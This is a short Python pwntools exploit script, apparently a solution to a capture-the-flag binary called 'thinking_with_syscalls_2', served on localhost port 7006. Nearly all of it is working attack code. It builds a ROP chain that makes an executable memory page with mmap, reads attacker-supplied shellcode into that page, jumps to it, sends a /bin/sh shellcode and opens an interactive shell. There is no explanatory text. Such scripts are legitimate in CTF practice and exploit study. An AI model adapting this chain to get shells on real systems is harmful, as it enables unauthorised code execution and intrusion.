#!/usr/bin/env python3

from pwn import *

exe = ELF("thinking_with_syscalls_2")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7006)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()
    mmap = list(map(p64, [
        rop.rax[0],
        0x9,
        rop.rdi[0],
        0x10000,
        rop.rsi[0],
        0x1000,
        rop.rdx[0],
        0x7,
        rop.r10[0],
        0x22,
        rop.syscall[0]
    ]))

    read = list(map(p64, [
        rop.rax[0],
        0,
        rop.rdi[0],
        0,
        rop.rsi[0],
        0x10000,
        rop.rdx[0],
        0x1000,
        rop.syscall[0]
    ]))

    payload = flat({
        8: [
            mmap,
            read,
            p64(0x10000)
        ] 
    })
    r.sendline(payload)
    r.sendline(asm(shellcraft.sh()))
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

